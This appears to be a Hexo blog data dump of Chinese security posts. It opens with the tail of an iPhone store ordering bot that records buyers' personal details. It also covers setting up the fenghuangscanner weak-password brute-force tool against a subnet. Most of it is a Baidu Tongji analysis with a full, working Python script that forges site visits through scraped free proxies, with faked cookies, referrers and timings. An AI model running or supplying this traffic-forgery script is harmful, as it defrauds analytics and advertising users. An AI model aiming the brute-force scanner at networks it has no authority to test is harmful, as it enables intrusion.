class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]订单状态-1 :: %s\"</span>%tmpUrl</div><div class=\"line\">        </div><div class=\"line\">            r = session.post(tmpUrl,data=data,timeout=retryTimeout)</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\">#tmpUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url']   # 错误</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/.*?\\.apple\\.com)'</span>,r.url).group(<span class=\"number\">1</span>)+re.search(<span class=\"string\">r'\\\"url\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"订单状态 :: %s\"</span>%tmpUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]订单状态-2 :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.get(tmpUrl,timeout=retryTimeout)</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\"># tmpUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url'] #报错</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/.*?\\.apple\\.com)'</span>,r.url).group(<span class=\"number\">1</span>)+re.search(<span class=\"string\">r'\\\"url\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]谢谢 :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.get(tmpUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            orderID = re.search(<span class=\"string\">r',\\\"orderNumber\\\":\\\"(.*?)\\\",'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            order[<span class=\"string\">'orderID'</span>] = orderID</div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>]=<span class=\"string\">\"https://store.apple.com/xc/cn/vieworder/\"</span>+orderID+<span class=\"string\">\"/\"</span>+order[<span class=\"string\">'email'</span>]+<span class=\"string\">\"/\"</span></div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">'成功'</span></div><div class=\"line\">            </div><div class=\"line\">            msg=order[<span class=\"string\">'lastName'</span>]+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'product'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'color'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'capacity'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>]</div><div class=\"line\">            print(<span class=\"string\">\" 🍻🍻🍻🍻🍻 \\t\\t%s\"</span>%msg)</div><div class=\"line\">            self.orderResult(order,<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</div><div class=\"line\">            order[<span class=\"string\">'orderID'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            self.orderResult(order,<span class=\"keyword\">False</span>)  <span class=\"comment\"># 购买失败！</span></div><div class=\"line\">        <span class=\"comment\"># json订单格式使用！</span></div><div class=\"line\">        <span class=\"comment\"># tmp = order['fileFullName']</span></div><div class=\"line\">        <span class=\"comment\"># filePath,fileName = os.path.split(tmp)</span></div><div class=\"line\">        <span class=\"comment\"># newFileName= \"done_\"+order['lastName']+order['firstName']+\"_\"+orderID+\"_\"+order['email']+fileName</span></div><div class=\"line\">        <span class=\"comment\"># logging.info(\"修改订单文件 :: %s --&gt; %s\"%(fileName,newFileName)[:80])</span></div><div class=\"line\">        <span class=\"comment\"># os.rename(tmp,os.path.join(filePath,newFileName))</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">orderResult</span><span class=\"params\">(self,order,success)</span>:</span></div><div class=\"line\">        msg=order[<span class=\"string\">'lastName'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'phone'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'email'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'state'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'city'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'district'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'street'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'payment'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'product'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'color'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'capacity'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'quantity'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'orderID'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>]+<span class=\"string\">\",\"</span>+      \\</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]+<span class=\"string\">\"\\n\"</span></div><div class=\"line\">        self.threadLock.acquire()</div><div class=\"line\">        <span class=\"keyword\">with</span> open(orderResult,<span class=\"string\">'a+'</span>,encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> fp:</div><div class=\"line\">            fp.writelines(msg)</div><div class=\"line\">        self.threadLock.release()</div><div class=\"line\"><span class=\"comment\"># 参数处理</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    headCharPic=<span class=\"string\">\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"</span></div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    <span class=\"comment\"># Creating a parser</span></div><div class=\"line\">    buyer=iPhoneBuyer()</div><div class=\"line\">    buyer.run_Threads()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>"},{"title":"弱口令检测工具fenghuangscanner的安装与使用","date":"2017-05-16T13:38:53.000Z","_content":"下载地址 : [https://github.com/wilson9x1/fenghuangscanner](https://github.com/wilson9x1/fenghuangscanner)\n<!-- more -->\n```bash\ncd fenghuangscanner\npip install -r requirements.txt         # 安装依赖包\npython fenghuangscanner.py -h           # 运行\n\n# 在安装依赖包的过程中可能会报错。  主要是pymssql这个包\nbrew install freetds\npip install cython\n\n# 如果仍然不行，\b\b使用下面命令安装最新的pymssql\npip install git+https://github.com/pymssql/pymssql.git\n\n# Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:\n# pip install git+https://github.com/pymssql/pymssql.git\n```\n\n问题参考   [https://github.com/Homebrew/homebrew-python/issues/338](https://github.com/Homebrew/homebrew-python/issues/338)\n\n### 使用\n```bash\npython fenghuangscan.py --ip 192.168.199.0/24\n```\n主机存活扫描 --> 端口扫描 --> 弱口令爆破","source":"_posts/弱口令检测工具fenghuangscanner的安装与使用.md","raw":"---\ntitle: 弱口令检测工具fenghuangscanner的安装与使用\ndate: 2017-05-16 21:38:53\ntags:\n---\n下载地址 : [https://github.com/wilson9x1/fenghuangscanner](https://github.com/wilson9x1/fenghuangscanner)\n<!-- more -->\n```bash\ncd fenghuangscanner\npip install -r requirements.txt         # 安装依赖包\npython fenghuangscanner.py -h           # 运行\n\n# 在安装依赖包的过程中可能会报错。  主要是pymssql这个包\nbrew install freetds\npip install cython\n\n# 如果仍然不行，\b\b使用下面命令安装最新的pymssql\npip install git+https://github.com/pymssql/pymssql.git\n\n# Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:\n# pip install git+https://github.com/pymssql/pymssql.git\n```\n\n问题参考   [https://github.com/Homebrew/homebrew-python/issues/338](https://github.com/Homebrew/homebrew-python/issues/338)\n\n### 使用\n```bash\npython fenghuangscan.py --ip 192.168.199.0/24\n```\n主机存活扫描 --> 端口扫描 --> 弱口令爆破","slug":"弱口令检测工具fenghuangscanner的安装与使用","published":1,"updated":"2017-06-08T13:14:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsz000v97uv01es31a7","content":"<p>下载地址 : <a href=\"https://github.com/wilson9x1/fenghuangscanner\" target=\"_blank\" rel=\"external\">https://github.com/wilson9x1/fenghuangscanner</a><br><a id=\"more\"></a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> fenghuangscanner</div><div class=\"line\">pip install -r requirements.txt         <span class=\"comment\"># 安装依赖包</span></div><div class=\"line\">python fenghuangscanner.py -h           <span class=\"comment\"># 运行</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 在安装依赖包的过程中可能会报错。  主要是pymssql这个包</span></div><div class=\"line\">brew install freetds</div><div class=\"line\">pip install cython</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 如果仍然不行，\b\b使用下面命令安装最新的pymssql</span></div><div class=\"line\">pip install git+https://github.com/pymssql/pymssql.git</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:</span></div><div class=\"line\"><span class=\"comment\"># pip install git+https://github.com/pymssql/pymssql.git</span></div></pre></td></tr></table></figure></p>\n<p>问题参考   <a href=\"https://github.com/Homebrew/homebrew-python/issues/338\" target=\"_blank\" rel=\"external\">https://github.com/Homebrew/homebrew-python/issues/338</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python fenghuangscan.py --ip 192.168.199.0/24</div></pre></td></tr></table></figure>\n<p>主机存活扫描 –&gt; 端口扫描 –&gt; 弱口令爆破</p>\n","site":{"data":{}},"excerpt":"<p>下载地址 : <a href=\"https://github.com/wilson9x1/fenghuangscanner\">https://github.com/wilson9x1/fenghuangscanner</a><br></p>","more":"<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> fenghuangscanner</div><div class=\"line\">pip install -r requirements.txt         <span class=\"comment\"># 安装依赖包</span></div><div class=\"line\">python fenghuangscanner.py -h           <span class=\"comment\"># 运行</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 在安装依赖包的过程中可能会报错。  主要是pymssql这个包</span></div><div class=\"line\">brew install freetds</div><div class=\"line\">pip install cython</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 如果仍然不行，\b\b使用下面命令安装最新的pymssql</span></div><div class=\"line\">pip install git+https://github.com/pymssql/pymssql.git</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:</span></div><div class=\"line\"><span class=\"comment\"># pip install git+https://github.com/pymssql/pymssql.git</span></div></pre></td></tr></table></figure><p></p>\n<p>问题参考   <a href=\"https://github.com/Homebrew/homebrew-python/issues/338\">https://github.com/Homebrew/homebrew-python/issues/338</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python fenghuangscan.py --ip 192.168.199.0/24</div></pre></td></tr></table></figure>\n<p>主机存活扫描 –&gt; 端口扫描 –&gt; 弱口令爆破</p>"},{"title":"百度统计JS脚本分析 & 流量伪造脚本","date":"2017-09-08T09:20:24.000Z","_content":">   花了两天时间，终于把百度统计的js代码大概看了看，并写了个刷流量的Python脚本。 \n\n<!-- more -->\n\n### 实现原理\n\n百度统计网站 [https://tongji.baidu.com](https://tongji.baidu.com)\n\n```javascript\n<script>\nvar _hmt = _hmt || [];\n(function() {\n\tvar hm = document.createElement(\"script\");\n\thm.src = \"https://hm.baidu.com/hm.js?789fd650fa0xxxxxxxxxxxx9d890b87f\";\n\tvar s = document.getElementsByTagName(\"script\")[0]; \n\ts.parentNode.insertBefore(hm, s);\n\t})();\n</script> \n```\n1. 在需要统计的页面加入上面的代码，引入hm.js脚本。\n\n2. 在获取该hm.js代码的同时，百度统计会往你的浏览器写入一个名字为“HMACCOUNT”的cookie，每一个cookie即为一个客户标识。（同IP不同用户的情况很常见，所以访问量不可能以IP为准）\n\n3. hm.js脚本执行，获取一些浏览器/网页/访问来源等一系列信息，包括屏幕尺寸、颜色深度、flash版本、用户语言等。\n\n### 参数分析\n\n从js代码中可以得知，所有的参数包括“cc cf ci ck cl cm cp cu cw ds ep et fl ja ln lo lt nv rnd si st su v cv lv api sn ct u tt”。\n\n经过吐血分析，大致的作用如下，以及一些实际示例（由于直接张贴有些乱，所以就贴图了。）\n![img](百度统计JS脚本分析-流量伪造脚本/image01.jpg)\n\n### python脚本实现\n\n主要思路：\n\n1. 访问目标url,获取标题和页面中的百度统计id。\n\n2. 从西刺代理获取免费代理。\n\n3. 访问hm.js获取cookie。\n\n4. 提交两次略有差异的GET请求到hm.gif\n\n```python\n#! /usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport argparse\nimport os\nimport sys\nimport re\nimport queue\nimport threading\nimport time\nimport logging\nimport random\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nlogging.basicConfig(level=logging.WARNING)\n\nclass Proxyer(object):\n    def __init__(self,proxyListFile=None):\n        self.proxyListFile = proxyListFile\n        self.proxyList = queue.Queue()      # proxy队列\n        self.xici_url='http://www.xicidaili.com/nn/'\n        self.xici_pageid=0                  # http://www.xicidaili.com/nn/{id}\n\n\n    def readFromFile(self):\n        with open(self.proxyListFile, 'r') as f:\n            for line in f.readlines():\n                self.proxyList.put(str.lower(line).strip(\"\\n\"))\n        return\n\n    def readFrom_xicidaili(self):   \n        self.xici_pageid = self.xici_pageid + 1 if self.xici_pageid<500 else 1      # 只读取前500个页面中的代理。\n        page_url = self.xici_url + str(self.xici_pageid) \n        print(\"Read Proxies From :: %s\"%page_url)\n        ipPool=[]\n        headers={\n        'Connection': 'close',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',\n        }\n        # Make a GET request and read the response\n        req = requests.get(page_url,headers=headers)\n\n        html_str=req.text\n        # the pattern(Regular expression) is depend on the response data from your url\n        pattern = r'\\s*<tr[\\s\\S]*?<td>(((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?))</td>\\s*?<td>(\\d*?)</td>[\\s\\S]*?<a[\\s\\S]*?>(.*?)</a>[\\s\\S]*?<td>(HTTP|HTTPS)</td>'\n        regex = re.compile(pattern)\n        s = regex.findall(html_str)\n        #s = [('221.204.103.145', '103.', '103', '145', '9797', '山西太原', 'HTTP'), ...]\n        for host in s:\n            hostdict = (host[0],host[4],host[5],host[-1])\n            ipPool.append(hostdict)\n\n        for x in ipPool:\n            self.proxyList.put(str.lower('%s://%s:%s'% (x[3], x[0],x[1])))\n        return\n\n    def getAProxy(self):\n        logging.info(\"tring get a proxy...\")\n        proxy = \"\"\n        try:\n            proxy = self.proxyList.get(timeout=1)\n        except:\n            if (self.proxyList.empty):\n                if self.proxyListFile is None :\n                    self.readFrom_xicidaili()\n                else:\n                    self.readFromFile()      # 读取一次用完后，再次读取。\n            proxy = self.proxyList.get()\n        return proxy\n\nclass Cheater(object):\n    def __init__(self,proxy_obj,url,source,vistiThread,visitCount):\n        self.proxyer=proxy_obj\n        self.sourceUrl=source\n        self.visitCount=visitCount\n        self.vistiThread=vistiThread\n        self.counter=0      # 已完成的访问数\n        self.threadLock = threading.Lock()      # 用于计数器\n        self.pageUrl=\"\"\n        self.pageTitle=\"\"\n        self.bdTongJiID=\"\"\n\n        try:\n            r = requests.get(url)\n            self.pageUrl = r.url\n            print(\"当前页面URL :: \",self.pageUrl)\n            \n            soup = BeautifulSoup(r.text, 'lxml')\n            html_str=soup.prettify()\n\n            self.pageTitle=soup.title.string\n\n            print(\"当前页面标题 :: \", self.pageTitle)\n        except:\n            print(\"目标网页读取失败！！！\")\n            sys.exit()\n            \n        try:\n\n            self.bdTongJiID=re.search(r'hm.src = \"https?\\:\\/\\/hm.baidu.com\\/hm.js\\?(\\w{32})\";',html_str,re.I).group(1)   # 正则表达式提取32位字符串id\n            print(\"获得百度统计代码ID :: \",self.bdTongJiID)\n            if len(self.bdTongJiID)!=32 :\n                print(\"百度统计ID异常\")\n                sys.exit()\n        except:\n            print(\"目标网页未引用百度统计js代码\")\n            sys.exit()\n\n    def run_Threads(self):\n        thread_arr=[]       # 线程列表list\n        for i in range(self.vistiThread):\n            t = threading.Thread(target=self.doCheat)\n            thread_arr.append(t)\n        for i in range(self.vistiThread):\n            thread_arr[i].start()\n        for i in range(self.vistiThread):\n            thread_arr[i].join()\n\n        print(\"Job Finish!!!  %d \"%self.counter)   \n\n\n    def doCheat(self):\n        while self.counter<self.visitCount:  \n            print(\".\",end=\"\")\n            proxy=self.proxyer.getAProxy()\n            try:\n                proxy=re.match(r'(https?\\:\\/\\/(\\d+\\.){3}\\d+\\:\\d+)',proxy).group(1)  # 正则表达式校验proxy\n            except:\n                print(\"proxy正则校验失败...\")\n                continue\n\n            protocol=proxy.split(\"://\")[0]\n            headers={\n                    'Connection': 'close',\n                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',\n                    'Accept': '*/*',\n                    'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',\n                    'Referer': self.pageUrl\n            }\n\n            try:\n                s=\"\"\n                s=requests.session()\n                # 访问hm.js?{ID}获取cookie\n                s.get(\"https://hm.baidu.com/hm.js?\"+self.bdTongJiID,headers=headers,proxies={protocol:proxy},verify=False,timeout=15)\n                # 直接访问1 | 站外跳入1\n                params={\n                        'cc':'0',\n                        'ck':'1',\n                        'cl':'24-bit',\n                        'ds':'1280x800',\n                        'et':'0',\n                        'fl':'26',\n                        'ja':'0',\n                        'ln':'zh-cn',\n                        'lo':'0',\n                        'lt':str(int(time.time())-2),     \n                        'nv':str( 0 if (self.sourceUrl is None) else 1),\n                        'rnd':str(random.randint(0,2147483647)),\n                        'si':str(self.bdTongJiID),\n                        'st':str( 4 if (self.sourceUrl is None) else 1),\n                        #'su':str( self.sourceUrl if（self.sourceUrl is not None) else \"\" ),\n                        'v':'1.2.16',\n                        'lv':'3',\n                        'sn':str(int(time.time())%65535),\n                        'ct':'!!',\n                        'tt':self.pageTitle\n                }\n                if self.sourceUrl is not None:\n                    params['su']=self.sourceUrl\n                # 第一次提交数据\n                r=s.get(\"http://hm.baidu.com/hm.gif\",headers=headers,params=params,proxies={protocol:proxy},verify=False,timeout=5)\n                logging.info(r.url)\n                time.sleep(1)\n                # 直接访问2 | 站外跳入2\n                params['et']='87'\n                params['rnd']=str(random.randint(0,2147483647))\n                params.pop('sn')    # 移除 sn\n                params.pop('ct')    # 移除 ct\n                params.pop('tt')    # 移除 tt\n                ep={\n                    'netAll':random.randint(5,500),\n                    'netDns':0,\n                    'netTcp':0,\n                    'srv':random.randint(5,200),\n                    'dom':random.randint(250,750),\n                    'loadEvent':random.randint(800,1500),\n                    'qid':\"\",\n                    'bdDom':0,\n                    'bdRun':0,\n                    'bdDef':0\n                }\n\n                ep= '{\"netAll\":'+ str(random.randint(5,500)) + ',\"netDns\":0' + ',\"netTcp\":0' + ',\"srv\":' + str(random.randint(5,200)) +   ',\"dom\":' + str(random.randint(250,750))+',\"loadEvent\":' + str(random.randint(800,1500))+',\"qid\":\"\",\"bdDom\":0,\"bdRun\":0,\"bdDef\":0}'\n\n                params['ep']=str(ep)     # 顺序变乱，尚不清楚是否影响使用\n                # 第二次提交数据\n                r=s.get(\"http://hm.baidu.com/hm.gif\",headers=headers,params=params,proxies={protocol:proxy},verify=False,timeout=5)\n                logging.info(r.url)\n                self.threadLock.acquire()\n                self.counter = self.counter + 1\n                print(\"\\rSuccess %d times\"%self.counter)\n                self.threadLock.release()\n            except:\n                #print(\"Failed! Do again...\")\n                print(\".\",end=\"\")\n            finally:\n                pass     \n\n            time.sleep(1)\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # Creating a parser\n    parser=argparse.ArgumentParser(\n        #prog=\"BingoBF\",\n        usage=\"%(prog)s [options] \",\n        description='刷百度统计访问数据',\n        epilog=\"+---+\\n\"\n        )\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\"-u\",dest=\"url\",action=\"store\",required=True,help=\"目标URL，HM_ID从网页中提取\")\n\n    parser.add_argument(\"--proxyList\",dest=\"proxyList\",action=\"store\",default=None,help=\"代理地址列表文件，格式： http://127.0.0.1:8080 ; 如空，则自动从xicidaili.com/nn上爬取。\")\n\n    parser.add_argument(\"-s\",dest=\"source\",action=\"store\",default=None,help=\"流量来源地址\")\n\n    parser.add_argument(\"-c\",dest=\"count\",action=\"store\",default=10, type=int , help=\"访问次数 (目前只实现单一网页,单次访问统计),默认10次\")\n\n    parser.add_argument(\"-t\",dest=\"threads\",action=\"store\",default=1,type=int,help=\"线程数，默认为1\")\n\n    args=parser.parse_args()\n\n    proxy_obj=Proxyer(args.proxyList)   # 生成一个Proxyer对象\n    cheater_obj = Cheater(proxy_obj,args.url,args.source,args.threads,args.count)   # 生成一个Cheater对象\n\n    cheater_obj.run_Threads()\n\nif __name__ == '__main__':\n    main()\n```\n\n","source":"_posts/百度统计JS脚本分析-流量伪造脚本.md","raw":"---\ntitle: 百度统计JS脚本分析 & 流量伪造脚本\ndate: 2017-09-08 17:20:24\ntags: python\n---\n>   花了两天时间，终于把百度统计的js代码大概看了看，并写了个刷流量的Python脚本。 \n\n<!-- more -->\n\n### 实现原理\n\n百度统计网站 [https://tongji.baidu.com](https://tongji.baidu.com)\n\n```javascript\n<script>\nvar _hmt = _hmt || [];\n(function() {\n\tvar hm = document.createElement(\"script\");\n\thm.src = \"https://hm.baidu.com/hm.js?789fd650fa0xxxxxxxxxxxx9d890b87f\";\n\tvar s = document.getElementsByTagName(\"script\")[0]; \n\ts.parentNode.insertBefore(hm, s);\n\t})();\n</script> \n```\n1. 在需要统计的页面加入上面的代码，引入hm.js脚本。\n\n2. 在获取该hm.js代码的同时，百度统计会往你的浏览器写入一个名字为“HMACCOUNT”的cookie，每一个cookie即为一个客户标识。（同IP不同用户的情况很常见，所以访问量不可能以IP为准）\n\n3. hm.js脚本执行，获取一些浏览器/网页/访问来源等一系列信息，包括屏幕尺寸、颜色深度、flash版本、用户语言等。\n\n### 参数分析\n\n从js代码中可以得知，所有的参数包括“cc cf ci ck cl cm cp cu cw ds ep et fl ja ln lo lt nv rnd si st su v cv lv api sn ct u tt”。\n\n经过吐血分析，大致的作用如下，以及一些实际示例（由于直接张贴有些乱，所以就贴图了。）\n![img](百度统计JS脚本分析-流量伪造脚本/image01.jpg)\n\n### python脚本实现\n\n主要思路：\n\n1. 访问目标url,获取标题和页面中的百度统计id。\n\n2. 从西刺代理获取免费代理。\n\n3. 访问hm.js获取cookie。\n\n4. 提交两次略有差异的GET请求到hm.gif\n\n```python\n#! /usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport argparse\nimport os\nimport sys\nimport re\nimport queue\nimport threading\nimport time\nimport logging\nimport random\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nlogging.basicConfig(level=logging.WARNING)\n\nclass Proxyer(object):\n    def __init__(self,proxyListFile=None):\n        self.proxyListFile = proxyListFile\n        self.proxyList = queue.Queue()      # proxy队列\n        self.xici_url='http://www.xicidaili.com/nn/'\n        self.xici_pageid=0                  # http://www.xicidaili.com/nn/{id}\n\n\n    def readFromFile(self):\n        with open(self.proxyListFile, 'r') as f:\n            for line in f.readlines():\n                self.proxyList.put(str.lower(line).strip(\"\\n\"))\n        return\n\n    def readFrom_xicidaili(self):   \n        self.xici_pageid = self.xici_pageid + 1 if self.xici_pageid<500 else 1      # 只读取前500个页面中的代理。\n        page_url = self.xici_url + str(self.xici_pageid) \n        print(\"Read Proxies From :: %s\"%page_url)\n        ipPool=[]\n        headers={\n        'Connection': 'close',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',\n        }\n        # Make a GET request and read the response\n        req = requests.get(page_url,headers=headers)\n\n        html_str=req.text\n        # the pattern(Regular expression) is depend on the response data from your url\n        pattern = r'\\s*<tr[\\s\\S]*?<td>(((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?))</td>\\s*?<td>(\\d*?)</td>[\\s\\S]*?<a[\\s\\S]*?>(.*?)</a>[\\s\\S]*?<td>(HTTP|HTTPS)</td>'\n        regex = re.compile(pattern)\n        s = regex.findall(html_str)\n        #s = [('221.204.103.145', '103.', '103', '145', '9797', '山西太原', 'HTTP'), ...]\n        for host in s:\n            hostdict = (host[0],host[4],host[5],host[-1])\n            ipPool.append(hostdict)\n\n        for x in ipPool:\n            self.proxyList.put(str.lower('%s://%s:%s'% (x[3], x[0],x[1])))\n        return\n\n    def getAProxy(self):\n        logging.info(\"tring get a proxy...\")\n        proxy = \"\"\n        try:\n            proxy = self.proxyList.get(timeout=1)\n        except:\n            if (self.proxyList.empty):\n                if self.proxyListFile is None :\n                    self.readFrom_xicidaili()\n                else:\n                    self.readFromFile()      # 读取一次用完后，再次读取。\n            proxy = self.proxyList.get()\n        return proxy\n\nclass Cheater(object):\n    def __init__(self,proxy_obj,url,source,vistiThread,visitCount):\n        self.proxyer=proxy_obj\n        self.sourceUrl=source\n        self.visitCount=visitCount\n        self.vistiThread=vistiThread\n        self.counter=0      # 已完成的访问数\n        self.threadLock = threading.Lock()      # 用于计数器\n        self.pageUrl=\"\"\n        self.pageTitle=\"\"\n        self.bdTongJiID=\"\"\n\n        try:\n            r = requests.get(url)\n            self.pageUrl = r.url\n            print(\"当前页面URL :: \",self.pageUrl)\n            \n            soup = BeautifulSoup(r.text, 'lxml')\n            html_str=soup.prettify()\n\n            self.pageTitle=soup.title.string\n\n            print(\"当前页面标题 :: \", self.pageTitle)\n        except:\n            print(\"目标网页读取失败！！！\")\n            sys.exit()\n            \n        try:\n\n            self.bdTongJiID=re.search(r'hm.src = \"https?\\:\\/\\/hm.baidu.com\\/hm.js\\?(\\w{32})\";',html_str,re.I).group(1)   # 正则表达式提取32位字符串id\n            print(\"获得百度统计代码ID :: \",self.bdTongJiID)\n            if len(self.bdTongJiID)!=32 :\n                print(\"百度统计ID异常\")\n                sys.exit()\n        except:\n            print(\"目标网页未引用百度统计js代码\")\n            